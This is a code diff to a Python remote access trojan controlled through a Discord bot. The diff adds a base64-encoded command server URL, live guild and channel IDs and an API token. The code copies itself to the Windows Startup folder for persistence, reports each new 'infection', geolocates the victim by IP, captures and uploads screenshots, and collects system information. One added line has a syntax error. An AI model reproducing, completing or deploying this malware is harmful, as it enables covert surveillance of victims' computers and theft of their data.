@@ -9,8 +9,10 @@ import pyautogui
 import getpass
 import psutil
 import PIL
+from PIL import ImageGrab
+from functools import partial
 
-encryptedapi="<Base64 encoded api url>"
+encryptedapi="aHR0cHM6Ly9nb2RzZXllLmZyZWUuYmVlY2VwdG9yLmNvbS8="
 base64_string =encryptedapi
 base64_bytes = base64_string.encode("ascii")
 sample_string_bytes = base64.b64decode(base64_bytes)
@@ -19,34 +21,24 @@ gettoken=requests.get(api)
 tokenjson=gettoken.json()
 encryptedtoken=tokenjson["token"]
 base64_string =encryptedtoken
-base64_bytes = base64_string.encode("ascii")
-sample_string_bytes = base64.b64decode(base64_bytes)
-decryp1 = sample_string_bytes.decode("ascii")
-base64_string =decryp1
-base64_bytes = base64_string.encode("ascii")
-sample_string_bytes = base64.b64decode(base64_bytes)
-decryp2 = sample_string_bytes.decode("ascii")
-base64_string =decryp2
-base64_bytes = base64_string.encode("ascii")
-sample_string_bytes = base64.b64decode(base64_bytes)
-decryp3 = sample_string_bytes.decode("ascii")
-base64_string =decryp3
-base64_bytes = base64_string.encode("ascii")
-sample_string_bytes = base64.b64decode(base64_bytes)
-decryp4 = sample_string_bytes.decode("ascii")
-base64_string =decryp4
-base64_bytes = base64_string.encode("ascii")
-sample_string_bytes = base64.b64decode(base64_bytes)
-decryp5 = sample_string_bytes.decode("ascii")
-TOKEN=decryp5
+count=0
+maximum=5
+
+while count<maximum:
+  base64_bytes = base64_string.encode("ascii")
+  sample_string_bytes = base64.b64decode(base64_bytes)
+  decryp1 = sample_string_bytes.decode("ascii")
+  base64_string=decryp1
+  count=count+1
+
+TOKEN=base64_string
 
 persistencefile=f"C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/startup.py"
 if not persistencefile:
-  shutil.copy(__file__, "startup.py")
+  shutil.copy(__file__,"startup.py")
 
 malWhere = commands.Bot(command_prefix='$')
 malWhere.remove_command('help')
-guild = malWhere.get_guild(<guild-id>)
 
 r = requests.get('https://api.ipify.org?format=json')
 response=r.json()
@@ -55,9 +47,9 @@ ip4chan=ip.replace(".","")
 
 @malWhere.event
 async def on_ready():
+  guild = malWhere.get_guild(874824520467349504)
   try:
-    print(f"logged in as {malWhere}")
-    infeinfectionschannel=malWhere.get_channel(<infection-channel-id>)
+    infectionschannel=malWhere.get_channel(874824520693874756)
     existing_channel = discord.utils.get(guild.channels, name=ip4chan)
     if not existing_channel:
       embed=discord.Embed(title="New Infection", url="", description=(f"New Infection from {ip} connection is established.. wating for commands"))
@@ -66,8 +58,8 @@ async def on_ready():
     else:
       embed=discord.Embed(title="Duplicate Infection", url="", description=(f"{ip} already infected connection is established.. wating for commands"))
       await infectionschannel.send(embed=embed)
-  except:
-    ctx.message.send("An Error Has Occured Please Try Again")
+  except Exception as e:
+    await infectionschannel.send(f"An Error Has Occured Please Try Again {e}")
    
 @malWhere.command()
 async def help(ctx,type):
@@ -99,7 +91,7 @@ async def help(ctx,type):
 async def geolocate(ctx):
   try:
     if str(ctx.channel)==(ip4chan):
-      r = requests.get(f'http://ipinfo.io/{ip}?token=<token comes in your api url>')
+      r = requests.get(f'http://ipinfo.io/{ip}?token=51030d1b61679e')
       response=r.json()
       embed=discord.Embed(title="Location Data", url=f"https://www.google.com/maps/search/4{response['loc']}/@{response['loc']},17z", description=f"{ip}'s Location data", color=0xFF5733)
       embed.add_field(name="IP", value=ip, inline=False)
@@ -111,24 +103,28 @@ async def geolocate(ctx):
       await ctx.message.delete()
     else:
       await ctx.channel.send("wrong channel skid")
-  except:
-    ctx.message.send("An Error Has Occured Please Try Again")
+  except Exception as e:
+    await ctx.send(f"An Error Has Occured Please Try Again {e}")
+    await ctx.message.delete())
 
 @malWhere.command()
 async def screenshot(ctx):
   try:
-    existing_channel = discord.utils.get(guild.channels, name=(f"{ip4chan}-media"))
-    channel_id = existing_channel.id
+    guild = malWhere.get_guild(874824520467349504)
+    ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
+    existing_channel = discord.utils.get(ctx.guild.channels, name=f"{ip4chan}-media")
     if not existing_channel:
       await guild.create_text_channel(f"{ip4chan}-media")
+    channel_id = existing_channel.id
     myScreenshot = pyautogui.screenshot()
     myScreenshot.save(r'tempimage.png')
     with open('tempimage.png', 'rb') as f:
       picture = discord.File(f)
       mediachan=malWhere.get_channel(channel_id)
       await mediachan.send(file=picture)
-  except:
-    ctx.message.send("An Error Has Occured Please Try Again")
+  except Exception as e:
+    await ctx.send(f"An Error Has Occured Please Try Again {e}")
+    await ctx.message.delete()
 
 @malWhere.command()
 async def pcinfo(ctx):
@@ -147,8 +143,9 @@ async def pcinfo(ctx):
       await ctx.message.delete()
     else:
       await ctx.channel.send("wrong channel skid")
-  except:
-    ctx.message.send("An Error Has Occured Please Try Again")
+  except Exception as e:
+    await ctx.send(f"An Error Has Occured Please Try Again {e}")
+    await ctx.message.delete()
 
 @malWhere.command()
 async def rickroll(ctx):
@@ -174,7 +171,8 @@ async def rickroll(ctx):
       os.popen("start MicrosoftEdge.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
       
     await ctx.message.delete()
-  except:
-    ctx.message.send("An Error Has Occured Please Try Again")
+  except Exception as e:
+    await ctx.send(f"An Error Has Occured Please Try Again {e}")
+    await ctx.message.delete()
 
 malWhere.run(TOKEN)
